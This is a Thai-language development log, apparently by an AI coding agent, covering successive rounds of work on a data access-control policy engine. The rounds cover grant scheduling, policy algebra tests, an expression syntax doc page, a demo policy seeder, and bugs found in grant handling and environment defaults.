- **start = end** — ต้องถูกปฏิเสธ ให้ตรงกับ `GrantStore` ที่ใช้ `isAfter` ไม่ใช่ `!isBefore`
- **ตั้ง start อนาคตโดยไม่ใส่ end** — ต้องยังเป็น open-ended (`validUntil: null`) ไม่ใช่ถูกเติมค่าให้เอง

แล้วยิงกับ backend ที่รันอยู่จริง (`grant-schedule.mjs`, 7 checks ผ่านหมด) ซึ่งพิสูจน์สิ่งที่ unit test พิสูจน์ไม่ได้:

| check | ผล |
|---|---|
| grant ที่เปิดเดือนหน้า **ถูกเก็บพร้อม instant ทั้งสองตัว** | ✅ |
| **และวันนี้ยังไม่ให้สิทธิ์อะไรเลย** | ✅ |
| **และตอนที่ยังไม่เปิด มันไม่ส่ง reason เข้า engine เลยแม้แต่อันเดียว** | ✅ (0 reasons) |
| grant ที่ window เปิดอยู่ ยังถูก ORG gate ปฏิเสธ (FR-3.1.4) | ✅ |
| **แต่มันเข้าถึง engine จริงในฐานะ `TABLE` reason** | ✅ |
| end ก่อน start → server ตอบ **400** | ✅ |
| window ยาวศูนย์ (start = end) → server ตอบ **400** | ✅ |

> check ที่ 3 คือตัวที่สำคัญ และตอนแรก**ไม่ได้เขียนไว้** — เพราะ `analyst_b` ถูกปฏิเสธทั้งสองทางอยู่แล้ว การเทียบ decision เฉยๆ จึงไม่ได้พิสูจน์อะไรเลย สิ่งที่พิสูจน์ได้คือ engine **ไม่เคยพิจารณา grant นั้น** ซึ่งต้องดูที่ `reasons`

### AG.3 ชิป — ย้ายน้ำหนักมาไว้ที่เดียว (`src/components/chips.tsx`) แล้วทั้งแอปได้พร้อมกัน

ชิปเดิมบางจนแทบไม่เห็น และสาเหตุมีสามอย่าง ไม่ใช่อย่างเดียว:
1. `tw:opacity-70` ครอบทั้งชิปสำหรับ facet ที่ **inherited** — ซึ่งจางทั้งพื้นและ**ตัวหนังสือ** และ inherited คือส่วนใหญ่ของแถว แปลว่าแถวส่วนใหญ่คือแบบที่จาง
2. `pillSizes.sm` ของ design system **ไม่มี font-weight** เลย
3. พื้นระดับ 50 คู่กับเส้นขอบระดับ 200 = เส้นขอบหายไปกับพื้นหลัง

แก้เป็น: พื้น **100** · เส้นขอบ **300** · `font-medium` · และ inherited เปลี่ยนจาก opacity เป็น **พื้นระดับ 50 แต่ตัวหนังสือเต็มความเข้ม** (ลูกศร ↑ บอกความต่างอยู่แล้ว ไม่ต้องจ่ายด้วยความอ่านออก)

**ไม่แตะ `ui-core-components` เลย** — `Badge` merge `props.className` **เป็นอันสุดท้าย** ผ่าน `cx` (`extendTailwindMerge`) คลาสของเราจึงชนะ `bg`/`text`/`outline` ของ design system ได้โดยไม่ต้อง fork (ทดลองยืนยันก่อนเขียนจริง ไม่ได้เดา)

สเกล utility **กลับด้านใน dark mode** (`utility-blue-100` → `blue-900`) การขยับ 50→100 และ 200→300 จึงเป็นการขยับ**ทิศเดียวกัน**ทั้งสองธีม ไม่ใช่ขยับเข้าหาพื้นหลังในธีมใดธีมหนึ่ง

**แล้วเจอปัญหาที่ตัวเองสร้าง:** พอชิป facet หนาขึ้น badge ที่อยู่ข้างๆ (`SERVICE`, `Tier2`, `draft`, `subscription`, …) กลายเป็นดูบางผิดที่ — แถวหนึ่งต้องอ่านเป็นแถวเดียว ไม่งั้นดูเหมือนทำพลาด แต่ badge พวกนี้มี **~60 จุดใน 17 ไฟล์** การไล่ใส่ `className` ทีละจุดคือหนี้ที่แตะไม่ได้

ทางที่เลือก: `src/components/chips.tsx` ถือ `CHIP_WEIGHT` / `CHIP_INHERITED` / `badgeWeight()` และ component `Chip` ที่ห่อ `Badge` แล้วทุกหน้า import ว่า `import { Chip as Badge } from '…/components/chips'` — **call site ไม่ต้องแก้สักจุด** และน้ำหนักทั้งแอปเปลี่ยนหรือถอดได้จากไฟล์เดียว

`type="modern"` **ถูกยกเว้นโดยตั้งใจ** — มันคือชิปขาวขอบบาง ที่ชื่อ owner ใช้อยู่ การใส่สีให้ชื่อคนคือการเอาชื่อคนไปแข่งกับ governance facet ที่อยู่ข้างๆ

**พิสูจน์ด้วยตา** (Playwright, 2x) ไม่ใช่แค่เทสต์ผ่าน: หน้า asset ชิป domain มีพื้นและขอบจริงแล้ว · หน้า Policies ชิป `draft` / `subscription` / scope อ่านออกแล้ว · หน้า Governance ชิป `one value only` เหมือนกัน · และ probe computed style ยืนยันว่า facet ที่ `direct` ทุกตัวได้พื้น 100 เท่ากัน (ที่ตาเห็นว่าอันหนึ่งจางกว่าในภาพแรกคือ antialiasing ของข้อความที่ถูก truncate ไม่ใช่ของจริง)

### AG.4 กับดักที่เสียเวลาไปรอบนี้ — เขียนไว้กันโดนซ้ำ

- **`vite build` เปล่าๆ ทำ bundle ของ prod พัง** — ต้อง `MSYS_NO_PATHCONV=1 VITE_BASE=/Arak/ npx vite build` เสมอ ไม่งั้น `index.html` ชี้ `assets/…` แบบไม่มี prefix แล้วหน้าเว็บที่ `:8090/Arak/` ขึ้นขาวเปล่า (404 ทั้ง js และ css) — **อาการเหมือน backend ตาย แต่ backend ปกติดี**
- jar ที่เสิร์ฟ `dist` **cache `index.html` ไว้** → build ใหม่แล้วต้อง restart backend ไม่งั้นได้ index เก่าที่ชี้ hash ที่ถูกลบไปแล้ว
- script ที่ `import { chromium } from 'playwright'` **ต้องอยู่ใน `frontend/app`** เท่านั้น อยู่ที่ scratchpad หรือ repo root = `ERR_MODULE_NOT_FOUND`
- heredoc ของ bash **ทำ `\n` ใน string literal ของ JS พัง** แม้จะ quote heredoc แล้วก็ตาม → script ที่มี escape ให้เขียนด้วย Write tool แล้วค่อยรัน

### AG.5 สิ่งที่สังเกตเห็นแต่ **ยังไม่แก้** (ต้องยืนยันก่อน)

หน้า `demo-pg.salesdb.sales.customer` แสดง domain สามชิป (`Finance`, `Finance / Risk`, `… / Risk / Credit`) และ probe แล้วพบว่า **ทั้งสามตัวมี `direct: true`** (tooltip เขียน "applied here" หมด) — ตาม FR-2A.2 ancestor ที่ถูกกางออกมาควรเป็น `is_direct = false` เหลือตัวล่างสุดตัวเดียวที่ `true`

ยังไม่แก้เพราะเป็นเรื่องของ materializer ฝั่ง backend ไม่ใช่เรื่องสี และต้องไปดู `asset_facet` จริงก่อนว่าเป็นที่ข้อมูลหรือที่ mapper — **แต่ถ้าเป็นบั๊กจริง มันทำให้ "tag นี้มาจากไหน" ตอบผิด ซึ่งคือคำถามที่ FR-2A.1 มีอยู่เพื่อจะตอบ**

### AG.6 ไฟล์ที่แตะรอบนี้

| ไฟล์ | อะไร |
|---|---|
| `frontend/app/src/components/chips.tsx` | **ใหม่** — `CHIP_WEIGHT` / `CHIP_INHERITED` / `badgeWeight()` / `Chip` |
| `frontend/app/src/pages/catalog/GrantDialog.tsx` | โหมด duration ⇄ dates, ช่องพิมพ์จำนวนวัน, `windowFrom()` |
| `frontend/app/src/pages/catalog/GrantDialog.test.tsx` | **ใหม่** — 9 tests |
| `frontend/app/src/pages/catalog/facets.tsx` | เอา `opacity-70` ออก, ใช้ `badgeWeight()` |
| อีก 17 ไฟล์ใน `src/pages/**` | เปลี่ยนบรรทัด import เป็น `Chip as Badge` อย่างเดียว ไม่แตะ call site |

---

## รอบก่อนหน้า — **พีชคณิตของ policy พิสูจน์เป็นชุด** · Doc syntax 1 หน้า · และ **ตัวอย่างทุกอันกลายเป็น policy จริงใน DB**

> โจทย์รอบนี้มาสามชั้น: *"ทดสอบให้ครบทุก Case · อย่าลืม and/or · หรือมีหลาย policy conflict กัน Union / Compliment / Intersection · ทั้ง Subscription, ให้ access ตรงใน UI, Data policy"* แล้วตามด้วย *"เขียนตัวอย่างการ Config กับ Syntax ที่รองรับใน Doc 1 หน้า เป็น link กดไปดูได้"* และปิดท้าย *"ทำตัวอย่างทุกแบบไปใน policy จริงเลยนะ จะเอาไป demo"*

### AF.1 `PolicyAlgebraTest` — 34 tests ที่เขียนคำตอบเป็น **เซต** ไม่ใช่ boolean

ชุดเดิมพิสูจน์ทีละคน (`analyst_a` ได้ / ไม่ได้) ซึ่งจับบั๊กประเภท "union กลายเป็น intersection" **ไม่ได้** เพราะทั้งสองแบบก็ตอบว่าคนคนนี้ผ่านเหมือนกัน รอบนี้เปลี่ยนวิธี: ทุกเคสยิง **ประชากร 5 คน** ผ่าน engine แล้ว assert **เซตของคนที่ผ่านทั้งเซต** ด้วย `containsExactlyInAnyOrder` — บั๊กที่พลาดไปคนเดียวไม่มีที่ซ่อน

ประชากรจงใจจัดให้ team / role / clearance / country **ตัดเซตคนละแบบ** ทั้งสี่แกน ถ้าไม่จัดแบบนี้ union กับ intersection อาจให้คำตอบเดียวกันโดยบังเอิญ แล้วเทสต์จะเขียวไม่ว่า engine ทำอันไหน

| nested class | พิสูจน์อะไร | tests |
|---|---|---|
| `Union` | policy ชั้นเดียวกัน = **OR** · idempotent (A∪A=A) · **commutative** (policy มาจาก query ที่ไม่การันตีลำดับ — ถ้าข้อนี้พังเมื่อไหร่ สิทธิ์จะขึ้นกับอารมณ์ของ database) · `principals` list ในใบเดียว = union เท่ากับแยกสองใบ · union ว่าง = ปิด | 5 |
| `Intersection` | policy ต่างชั้น = **AND** · **`localCannotWiden`** (ORG=Finance ∩ TABLE=analyst ทุกคน → `{fin_l1, fin_l2}` **ไม่ใช่** `{…, eng_sg}`) · intersection ว่าง = ไม่ให้ใครเลย ไม่ตกกลับไปข้างใดข้างหนึ่ง · ORG∩SCHEMA∩TABLE (ชั้นกลางคือชั้นที่ implementation แบบ "global vs local" มักข้าม) · ชั้นที่ไม่มี policy = **งดออกเสียง ไม่ใช่ปิด** | 7 |
| `Complement` | DENY = **ลบออก** · DENY ที่ COLUMN ลบ ALLOW ที่ ORG ได้ (deny ชนะทุกชั้น) · **`exemptionIsComplementOfComplement`** — `(A \ D) ∪ (A ∩ E)` และ exemption ที่ชี้คนที่ ALLOW ไม่เคยถึง **ไม่ทำให้เขาเข้าได้** (exemption ปลดจาก DENY ไม่ใช่ตัวให้สิทธิ์) · DENY ลอยๆ ไม่เปิดประตู (complement ของศูนย์คือศูนย์ ไม่ใช่ทุกอย่าง) · **`orderOfOperations`** — `(A1 ∪ A2) \ D` ไม่ใช่ `(A1 \ D) ∪ A2` | 6 |
| `Selectors` | ฝั่ง asset: `or` / `and` / `not` · **De Morgan** `not(A or B) == (not A) and (not B)` (+ assert ว่าทั้งสองข้างไม่ว่าง ไม่งั้น "เท่ากันเพราะพังเหมือนกันทั้งคู่" ก็ผ่าน) · **distributivity** · `contains` ครอบลูกหลาน / `eq` ไม่ครอบ (แผนข้อ 4a) | 6 |
| `DataAlgebra` | เซต column ที่ถูก mask = **union** ข้าม policy · mask สองอันบน column เดียว **join ที่อันเข้มกว่า** ไม่ว่าอยู่ชั้นไหน (NULLIFY ชนะ PARTIAL ที่ลึกกว่า) · row filter **intersect** (ทั้งสอง predicate ต้องรอด — ถ้า filter ที่ลึกกว่าแทนที่อันตื้นได้ ทุก row set ในระบบจะกว้างขึ้นเงียบๆ) · hidden column union · **monotone**: เพิ่ม data policy แล้วต้องไม่เห็นมากขึ้น | 6 |
| `Mixed` | decision ที่ถูกปฏิเสธ **ไม่พก mask/filter/hide ติดมา** (ถ้าพกมา = บอกคนที่เข้าไม่ได้ว่ามี column อะไรและอันไหน sensitive) · data policy 3 ใบโดยไม่มี subscription = ยังปฏิเสธ · mask เป็นรายคน ไม่ใช่รายตาราง · **`orderIndependent`** — 7 policy เรียงหน้า/เรียงหลัง ให้ allowed, masks, functions, hidden **และ cache key เดียวกัน** | 4 |

รันแรกล้มจริง 5 เคส — 4 เคสเป็นบั๊กของเทสต์เอง (เทียบชื่อ table สั้นกับ FQN เต็ม) และ **1 เคสเป็นความคาดหวังของผมที่ผิด ไม่ใช่ engine ผิด**: `localCannotWiden` เดิมตั้ง ORG=Finance ∩ TABLE=Engineering แล้วคาด `{fin_l1, fin_l2}` ทั้งที่ intersection มันว่างจริงๆ · แก้โดยให้ local เป็น **superset** (`role=analyst`) เพื่อให้คำตอบไม่ว่าง — จงใจ เพราะคำตอบว่างมันสอดคล้องกับกรณีที่ engine **โยน local policy ทิ้ง** ด้วย ซึ่งเป็นบั๊กคนละตัวที่อาการเหมือนกันเป๊ะ

### AF.2 `GrantCompositionIT.AgainstDataPolicies` — ขา "ให้ access ตรงใน UI" ตัดกับ data policy

4 tests · เคสที่ห้ามพลาดที่สุดคือ **`grantIsNotAnUnmask`**: activate data policy ที่ nullify `email` → grant CUSTOMER ให้ `analyst_a` ตรงๆ → ต้องเข้าได้ **และ `email` ต้องยัง `NULLIFY` อยู่**

ที่ต้องมีเทสต์ข้อนี้เพราะ UI เรียกทั้งสองอย่างว่า "access" เหมือนกัน และถ้าพลาดคือ **ปุ่มคลิกเดียวที่คนกดบ่อยที่สุด ถอด masking ออกจาก PII เงียบๆ โดย query สำเร็จและไม่มี error ที่ไหนเลย** · อีกสามข้อ: grant รับ row filter ที่มีอยู่แล้วมาด้วย · grant ตรง + grant ผ่านทีม = union (access เดียว mask เดียว ไม่ใช่สองชุด) · revoke ใบหนึ่งแล้วอีกใบยังอยู่ (ขา complement และเป็นข้อที่ owner พลาดบ่อย)

### AF.3 Doc syntax 1 หน้า — `/docs/expressions` (กดจากช่อง expression ได้)

- `ExpressionReference` + `reference.json` อยู่ใน **jar ของ engine** — หน้าเว็บ render สิ่งที่ backend ส่งมาล้วนๆ **ไม่มี example / operator / ชื่อ facet ตัวไหนเขียนซ้ำในฝั่ง front end** แปลว่าหน้านี้อธิบายภาษาที่ deployment นี้รันอยู่จริงเสมอ
- `ExpressionResource` ใหม่: `GET /v1/expressions/reference` (เอกสาร) · `POST /v1/expressions/validate` (parser ตัวเดียวกับตอน save)
- `ExpressionReferenceTest` **รันเอกสาร**: ทุก example × ทุก case ยิงผ่าน evaluator จริง, ทุกอันต้องผ่าน `validate`, ทุกชื่อใน root ที่เป็น closed list ต้องเป็นชื่อที่ parser resolve ได้, และทุกอันใน `rejected` ต้องถูกปฏิเสธจริง → **example ที่เลิกเป็นจริง CI ล้มก่อนผู้ใช้อ่าน**
- ในหน้า: กล่อง **Try one** พิมพ์ทดสอบกับ parser จริงได้ · ทุก example มีปุ่ม *Check against the engine* · แยก **error (save ไม่ผ่าน)** ออกจาก **warning (save ผ่าน แล้วไม่ให้สิทธิ์ใคร)** ให้เห็นชัด — สองเรื่องนี้คนละเรื่องกันสำหรับคนอ่าน
- ช่อง expression ใน builder: ลิงก์ *Syntax and worked examples* + validate สดแบบ debounce 400ms · ลิงก์และ verdict อยู่ **นอก** `<label>` เพื่อไม่ให้คลิกเดียวมีสองความหมาย และเพื่อให้ verdict โผล่/หายโดยไม่ดันช่องพิมพ์ใต้เคอร์เซอร์ · ตัว `Field` ไม่ถูกแตะเลย หน้าตาเดิมทุกพิกเซล

### AF.4 **ตัวอย่างทุกอัน = policy จริงใน DB** (`scripts/seed-example-policies.mjs`)

ตามที่สั่งว่าจะเอาไป demo · script อ่าน example **จาก service ที่รันอยู่** ไม่ใช่จากสำเนาในไฟล์ → seed ภาษาที่ engine ไม่ได้รันไม่ได้ และ example ที่เพิ่มใน reference จะโผล่มาเองรอบหน้าโดยไม่ต้องแก้ script · **idempotent** (รันซ้ำ = update ไม่ชนกับ unique key `(name, environment)`)

| ผล | |
|---|---|
| seed แล้ว | **11 ใบ** ชื่อ `example-<id>` บน `demo-pg.salesdb.sales.customer` · binding ใบละ 1 target |
| `example-row` | กลายเป็น **DATA policy + row filter** อัตโนมัติ เพราะ `POST /validate` ตอบ `rowDependent: true` และ subject rule ใช้ row ไม่ได้ (PolicyStore ปฏิเสธ) — script ทำตามที่หน้า doc แนะนำเป๊ะ |
| state | **DRAFT ทุกใบ — จงใจ** · 11 policy ACTIVE บน table เดียวกัน compose แบบ intersection (FR-5.1) → ทุกคนโดนปฏิเสธหมด แล้ว demo จะไม่เหลืออะไรให้ดู · เป็น draft มันก็ยังเป็น row จริงที่อ่านได้ / มี version / มี binding และ **impact analysis รันทีละใบผ่าน engine จริง** ซึ่งคือสิ่งที่ทำให้ demo ทีละ example ได้ · จะ activate = กดเดียวที่ lifecycle |

พิสูจน์ว่า demo เดินจริงผ่าน `GET /v1/policies/{id}/impact` — ตัวเลขตรงกับที่หน้า doc เขียนไว้:

| example | expression | ใครเปลี่ยน |
|---|---|---|
| `residency` | `user.country == asset.prop('dataResidency')` (table = TH) | `analyst_a`, `steward_c` **GAINS** · `analyst_b` (SG) ไม่ขยับ |
| `list` | `user.department in ['FINANCE','RISK']` | ทั้งสามคน GAINS |
| `grouping` | `(team=='Finance' \|\| 'auditor' in roles) && country=='TH'` | `analyst_a`, `steward_c` · `analyst_b` ไม่ขยับ |
| `typo` | `user.contry == 'TH'` | **ไม่มีใครเลย** — บทเรียน silent failure ที่ demo ให้ดูได้จริงว่า policy ที่ save ผ่าน อ่านกลับมาเหมือนที่พิมพ์ทุกตัวอักษร แล้วไม่ให้สิทธิ์ใครสักคน |

หน้า doc ลิงก์ example → policy โดย **match จากชื่อ** ไม่ได้ฝัง id ไว้ → deployment ที่ยังไม่เคยรัน seeder ก็แสดง example ตามปกติ แค่ไม่มีลิงก์ (ซึ่งเป็นความจริง) แทนที่จะลิงก์ไปหา policy ที่ไม่มีอยู่ — มีเทสต์คุมข้อนี้ข้อหนึ่ง

**วิธีรัน**
```bash
set -a && . ./.env && set +a
node scripts/seed-example-policies.mjs                                    # localhost:8080/api
ARAK_URL=http://localhost:8090/Arak/api node scripts/seed-example-policies.mjs
```

### AF.5 ไฟล์ที่เพิ่ม/แก้รอบนี้

| ไฟล์ | |
|---|---|
| `backend/dac-engine/.../ExpressionReference.java` + `resources/expressions/reference.json` | เอกสารเป็นข้อมูล อยู่ใน jar ของ engine |
| `backend/dac-engine/.../PolicyExpressionEvaluator.java` | เปิด `analyse()` ให้ตอบ rowDependent + รายชื่อ user attribute ที่อ้างถึง |
| `backend/dac-service/.../resources/ExpressionResource.java` | `/v1/expressions/reference` · `/v1/expressions/validate` |
| `backend/dac-engine/src/test/.../PolicyAlgebraTest.java` | 34 tests |
| `backend/dac-engine/src/test/.../ExpressionReferenceTest.java` | `@TestFactory` รันทุก example ในเอกสาร |
| `backend/dac-service/src/test/.../GrantCompositionIT.java` | + nested `AgainstDataPolicies` 4 tests |
| `frontend/app/src/api/expressions.ts` | typed client |
| `frontend/app/src/pages/docs/ExpressionDocsPage.tsx` (+ `.test.tsx` 5 tests) | หน้า doc |
| `frontend/app/src/pages/policies/SubjectBuilder.tsx` | ลิงก์ + inline verdict (นอก Field) |
| `frontend/app/src/App.tsx` | route `/docs/expressions` **อยู่ในกรอบ auth** — reference บอกชื่อ facet/attribute ที่องค์กรนี้ใช้จริง ไม่ใช่ของแจกคนนอก |
| `scripts/seed-example-policies.mjs` | seeder |

### AF.6 ผลรันจริงรอบนี้

| ชุด | ผล |
|---|---|
| `./mvnw -q -am -pl backend/dac-engine test` | **exit 0** · PolicyAlgebra 34 · PolicyEngine 32 · Evaluator 13 · SelectorMatcher 10 · SubjectMatcher 13 · SubscriptionPolicy 35 · TimeMatcher 12 · + ExpressionReference (dynamic) |
| `./mvnw -am -pl backend/dac-service verify -Pintegration` | `GrantCompositionIT$AgainstDataPolicies` **4/4 ผ่าน** (ขา grant × data policy) |
| `npx tsc --noEmit` | **exit 0** |
| `npx jest --silent` | **17 suites / 92 tests ผ่าน** |
| `vite build` (base `/Arak/`) | **exit 0** — 866.27 kB JS / 223.87 kB CSS |
| seeder | รันสองรอบ: created 11 → updated 11 (idempotent จริง) |

> ⚠️ **กับดักที่เสียเวลาไปรอบนี้ บันทึกไว้กันพลาดซ้ำ**
> 1. `-DfailIfNoTests=false` **ไม่ได้** ทำให้ failsafe ยอมผ่าน parent pom — ตัวที่ใช่คือ `-Dfailsafe.failIfNoSpecifiedTests=false` · ถ้าไม่ใส่ `./mvnw -am -pl … verify -Dit.test=X` จะ BUILD FAILURE ที่ `dac-parent` ใน 1 วินาที โดยทุก module SKIPPED
> 2. **รายงาน failsafe/surefire เก่าค้าง** — รันที่ล้มก่อนถึง test phase ทิ้งรายงานรอบก่อนไว้ ซึ่งดู "เขียว" ทั้งที่ไม่ได้รันอะไรเลย → `rm -rf target/failsafe-reports` ก่อนรันแบบเจาะจงเสมอ แล้วดู exit code จริง
> 3. คำสั่ง background ที่ลงท้ายด้วย `echo` จะรายงาน **exit 0 เสมอ** ใน notification → ต่อท้ายด้วย `; echo "exit=$?" >> log` แล้วอ่านจาก log

---

## รอบก่อนหน้า — เขียน IT ให้ FR-7 แล้วพบว่า **grant ไม่เคยถึง engine เลยสักใบ** กับอีกสองบั๊กที่ซ่อนอยู่ใต้มัน

> รอบที่แล้วปิด FR-7 ด้วยการพิสูจน์ด้วยมือ (ตาราง 6 แถวในข้อ AD.1) แล้วจดค้างไว้ว่า *"property ข้อที่สามพิสูจน์ด้วยมือแล้ว แต่ยังไม่มีใน CI"* · รอบนี้เขียน IT ให้มัน แล้ว **ล้ม 5 จาก 12 ตั้งแต่รันแรก — ไม่ใช่เพราะเทสต์ผิด** · ทั้งสามบั๊กข้างล่างนี้ไม่มีตัวไหนมองเห็นได้จากหน้าจอ

### AE.1 🔴 grant ไม่เคยถูก engine อ่านเลยสักใบ ตั้งแต่วันที่ merge

`PolicyEngine.bind()` คัด policy ด้วย `SelectorMatcher.matches(policy.getSelector(), asset)` และ `matches(null, …)` คืน `false` เสมอ — **ซึ่งถูกแล้ว** สำหรับ policy ที่คนเขียน: selector ที่ไม่ได้ระบุอะไร ต้องแปลว่า "ไม่ selects อะไรเลย" ไม่ใช่ "selects ทุกอย่าง" (fail-closed)

แต่ **grant คือ policy ตัวเดียวที่ไม่มี selector โดยธรรมชาติ** เพราะมันไม่เคยถูกเขียนจาก facet — มีคนชี้ table หนึ่งใบให้คนหนึ่งคน แล้ว `GrantStore.asPolicy` พา asset มาใน `scopeFqn` แทน → **grant ทุกใบถูกทิ้งก่อนถึงขั้น compose**

แก้ที่ `PolicyEngine` ไม่ใช่ที่ `SelectorMatcher` และไม่ใช่ด้วยการปั้น selector ปลอมให้ grant (`FacetCondition.FacetType` ไม่มี `fqn` ให้ใช้อยู่แล้ว):

```java
private static boolean selects(Policy policy, AssetContext asset) {
  if (policy.getSelector() != null) {
    return SelectorMatcher.matches(policy.getSelector(), asset);
  }
  return policy.getScopeFqn() != null && policy.getScopeFqn().equals(asset.fqn());
}
```

ข้อยกเว้นถูกบีบให้แคบที่สุดเท่าที่จะทำได้ — ต้องมี `scopeFqn` **ตรงกับ asset ที่กำลังถาม** ไม่งั้น "policy ที่ไม่มี selector" จะกลายเป็น "policy ที่ใช้กับทุก asset" ซึ่งคือความพังที่ `SelectorMatcher` ตั้งใจกันไว้ตั้งแต่ต้น

### AE.2 🔴 grant ให้คนหนึ่งคน = ปิด table นั้นจากคนที่เหลือทั้งองค์กร

พอ grant ถึง engine ได้แล้ว เทสต์ล้มต่ออีกตัว และตัวนี้หนักกว่าตัวแรก

`decideSubscription` compose แบบ intersection: **ทุกชั้นที่มีความเห็นต้องอนุญาต** และ "ชั้นที่มีความเห็น" ถูกนิยามว่า *ชั้นที่มี ALLOW อยู่* · grant คือ ALLOW ที่ชั้น TABLE → **grant หนึ่งใบสร้าง gate ที่ชั้น TABLE ขึ้นมา** แล้วคนอื่นทุกคนที่ผ่าน ORG policy มาได้ ก็ตกที่ชั้นนี้เพราะ grant ไม่ได้ระบุชื่อเขา

พูดเป็นภาษาคน: **owner คนหนึ่งให้ analyst_a เข้า table หนึ่งใบ = ยึด table ใบนั้นคืนจากทุกคนที่เหลือ** โดยไม่มี log ไม่มีคำเตือน และหน้าจอยังแสดงว่า policy เดิม active อยู่ครบ

แก้โดยแยก "ALLOW ที่ตั้ง gate ได้" ออกจาก "ALLOW ที่เพิ่มสิทธิ์อย่างเดียว":

| | policy ที่คนเขียน | grant (FR-7) |
|---|---|---|
| เขียนจาก | selector บน facet → พูดแทน asset ทั้งกลุ่ม | ชื่อคนหนึ่งคน + table หนึ่งใบ |
| ตั้ง gate ให้ชั้นตัวเองได้ไหม | **ได้** — เป็นความเห็นเรื่องว่า "ใครควรผ่านชั้นนี้" | **ไม่ได้** — ไม่ได้พูดถึงใครนอกจากคนที่ระบุ |
| ผ่าน gate ที่ชั้นเดียวกันที่คนอื่นตั้งไว้ได้ไหม | ได้ | **ได้** — นี่คือประโยชน์ทั้งหมดของ grant |
| ผ่าน gate ชั้นที่สูงกว่า (ORG) ได้ไหม | — | **ไม่ได้** เว้นแต่ policy ชั้นนั้นเปิด `allowLocalOverride` (FR-3.1.4) |

**ผลสองชั้นที่ซ้อนกันอยู่:** `AccessQuery` (แท็บ Access) ตอบคำถาม "ใครเข้า table นี้ได้บ้าง" ด้วยการ **รัน engine ให้ทุก principal จริงๆ** ไม่ใช่อ่านตาราง grant มาบวกตาราง policy — ซึ่งเป็นการออกแบบที่ถูก และแปลว่าหน้าจอนั้นสะท้อนบั๊กทั้งสองตัวตรงๆ: ก่อนแก้ข้อ AE.1 **ไม่มีใครเคยขึ้นเป็น origin `GRANT` ได้เลย** และหลังจากนั้นพอมี grant หนึ่งใบ รายชื่อทั้งหน้าก็จะยุบเหลือคนที่ถือ grant คนเดียว — โดยหน้าจอรายงานอย่างมั่นใจว่านั่นคือคำตอบที่ถูก

ตัวแยกใช้ field เดียวกับข้อ AE.1: `additive(policy) == (policy.getSelector() == null)` · เมื่อไม่มี gate เลยทั้ง asset (เคสปกติของ FR-7 — table ที่ไม่มีใครเขียน policy ถึง) grant ที่ match คือคำตอบทั้งหมด

### AE.3 🪤 `PolicyStore.create` เติม `environment = 'dev'` ให้เงียบๆ ขณะที่ทุก decision ตัดสินใน `prod`

เทสต์สองตัวล้มด้วยทิศกลับด้าน (คาดว่า deny แต่ได้ allow) และคราวนี้ **ไม่ใช่บั๊กของ engine แต่เป็นกับดักที่ fixture เดินเข้าไปเหยียบ**

```java
// PolicyStore.java:120
.bind("environment", document.getEnvironment() == null ? "dev" : value(document.getEnvironment()))
```
ขณะที่ `DecisionService.DEFAULT_ENVIRONMENT = "prod"` และ `activeFor` กรอง `AND p.environment = :environment`

→ policy ที่สร้างโดยไม่ระบุ environment **save ผ่าน · bind ติด · activate ได้ · อ่านกลับมาครบทุก field · และไม่เคยถูกเรียกใช้** — ความพังแบบเดียวกับที่ commit `63361eb` แก้ไปแล้วรอบหนึ่ง แต่เหลือทางเข้าไว้อีกทาง

**ยังไม่แก้ในโค้ด production รอบนี้** เพราะการสลับ default เป็น `prod` แปลว่า **policy เก่าทุกแถวที่ตอนนี้นอนอยู่เฉยๆ ใน `dev` จะเริ่มบังคับใช้ทันทีที่ deploy** — เป็นการเปลี่ยนพฤติกรรมของข้อมูลที่มีอยู่แล้ว ไม่ใช่แค่แก้บั๊ก · จดเป็นช่องว่างข้อ 9 แทน · ฝั่ง fixture ปักไว้ที่ `DecisionService.DEFAULT_ENVIRONMENT` ตรงๆ

### AE.4 ⚠️ แก้บันทึกของรอบที่แล้ว — "หลักฐานจากของจริง" ในข้อ AD.1 พิสูจน์สิ่งที่เขียนไว้ไม่ได้

ตาราง 6 แถวในข้อ AD.1 จบด้วยแถวที่ว่า *grant ถูกบันทึกแล้วแต่ `analyst_b` ยังเข้าไม่ได้* แล้วสรุปว่า **"นี่คือ FR-5.1 ทำงานจริง — policy DENY ชนะ grant"**

ผลลัพธ์นั้นถูก แต่ **คำอธิบายพิสูจน์ไม่ได้** — "grant ถูก policy DENY ทับ" กับ "grant ไม่เคยถูกโหลดเลย" (ข้อ AE.1) ให้ผลหน้าจอเหมือนกันทุกประการ · การเช็คด้วยมือแยกสองกรณีนี้ไม่ออกโดยหลักการ เพราะมันดูได้แค่คำตอบสุดท้าย · IT แยกออกเพราะมันถามคำถามที่ขั้วกลับกันด้วย (**analyst_b ต้องเข้าได้**) ซึ่งเป็น assertion ที่ล้มทันทีถ้า ALLOW ฝั่งตรงข้ามไม่ทำงาน

> บทเรียนที่ควรจดไว้: **เทสต์ที่ยืนยันเฉพาะฝั่ง deny ผ่านได้ด้วยเหตุผลที่ผิด** — ระบบที่พังจนปฏิเสธทุกอย่างก็ทำให้เทสต์ฝั่ง deny เขียวหมดเหมือนกัน · ทุกกลุ่มเทสต์เรื่องสิทธิ์ต้องมีแถว "แล้วใครที่ *ควร* เข้าได้ ยังเข้าได้อยู่ไหม" เสมอ

### AE.5 `audit_decision.evaluation_ms` มีค่าแล้ว (ปิดช่องว่างข้อ 5)

จับเวลาที่ **จุดที่ผู้เรียกรอจริง** ใน `QueryService` ไม่ใช่ข้างใน engine — เพราะ NFR-2 ถามถึงเวลาที่ผู้ใช้รอ ไม่ใช่เวลาที่ engine ใช้คิด · ปัดขึ้นเสมอ เพราะ column ที่เป็นศูนย์ทั้งแถวกับ column ที่เป็น NULL ทั้งแถว ตอบคำถาม p95 ได้พอๆ กันคือไม่ได้เลย

### AE.6 🔴 หน้า asset ทุกหน้าจะ **404 ตอน refresh บน prod** — เจอเพราะลองเปิดของจริงที่ URL จริง

ผู้ใช้สั่งว่าอยากเห็น **แบบที่ลง prod ได้ ไม่ใช่ docker และไม่ใช่ dev server** · พอเปิด jar เสิร์ฟ `dist` ที่ build ด้วย `VITE_BASE=/Arak/` แล้วยิงตาม URL จริง เจอว่า:

```
GET /Arak/                                        → 200
GET /Arak/assets/index-C0TORp7Z.js                → 200
GET /Arak/catalog/prod-pg.SalesDB.dbo.customer    → 404   ← ทุกหน้า asset
```

